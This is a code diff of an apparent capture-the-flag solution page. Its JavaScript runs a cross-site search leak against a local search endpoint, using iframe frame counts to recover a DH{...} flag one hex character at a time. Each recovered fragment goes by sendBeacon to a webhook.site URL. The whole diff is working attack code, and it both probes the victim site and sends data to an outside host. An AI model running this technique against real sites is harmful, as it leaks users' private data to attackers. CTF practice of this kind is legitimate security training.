@@ -1,44 +1,44 @@
 <html>
 <body>
 <script>
-const WEBHOOK = "https://webhook.site/8088a9e6-c7fe-4518-ad97-fa0c73431f5f"; // 본인 서버 주소
+const WEBHOOK = "https://webhook.site/8088a9e6-c7fe-4518-ad97-fa0c73431f5f";
 const CHARSET = "0123456789abcdef";
 let known = "DH{";
 
-async function check(guess) {
+function check(guess) {
   return new Promise((resolve) => {
-    const w = window.open(
-      `http://127.0.0.1:8000/search?query=${encodeURIComponent(guess)}`
-    );
-    setTimeout(() => {
-      try {
-        const found = w.length > 0; // iframe이 있으면 length >= 1
-        w.close();
-        resolve(found);
-      } catch (e) {
-        w.close();
-        resolve(false);
-      }
-    }, 500);
+    const iframe = document.createElement("iframe");
+    iframe.src = `http://127.0.0.1:8000/search?query=${encodeURIComponent(guess)}`;
+    iframe.onload = () => {
+      setTimeout(() => {
+        try {
+          const found = iframe.contentWindow.length > 0;
+          document.body.removeChild(iframe);
+          resolve(found);
+        } catch(e) {
+          document.body.removeChild(iframe);
+          resolve(false);
+        }
+      }, 100);
+    };
+    document.body.appendChild(iframe);
   });
 }
 
 async function solve() {
-  // 플래그: DH{32자hex}
   for (let i = 0; i < 32; i++) {
     for (const c of CHARSET) {
       const guess = known + c;
       const hit = await check(guess);
       if (hit) {
         known += c;
-        // 중간 결과를 외부로 전송
-        fetch(`${WEBHOOK}?flag=${encodeURIComponent(known)}`);
+        navigator.sendBeacon(`${WEBHOOK}?flag=${encodeURIComponent(known)}`);
         break;
       }
     }
   }
   known += "}";
-  fetch(`${WEBHOOK}?flag=${encodeURIComponent(known)}`);
+  navigator.sendBeacon(`${WEBHOOK}?flag=${encodeURIComponent(known)}`);
 }
 
 solve();
